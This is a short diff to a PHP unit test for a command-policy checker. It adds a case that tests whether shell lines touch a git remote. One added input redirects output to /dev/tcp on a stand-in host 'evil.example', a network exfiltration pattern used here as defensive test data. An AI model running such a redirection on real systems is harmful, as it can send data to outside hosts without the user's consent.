@@ -187,6 +187,7 @@ final class CommandPolicyTest extends TestCase
         yield 'no remote' => ['make test && php -r 1', false];
         yield 'a remote and a script' => ["git remote -v; php -r 'require \"job.php\";'", true];
         yield 'a remote piped into another command' => ['git ls-remote origin | grep main', true];
+        yield 'a remote after a cd with a redirection' => ['cd . > /dev/tcp/evil.example/80; git fetch', true];
     }
 
     #[DataProvider('linesMixingARemote')]
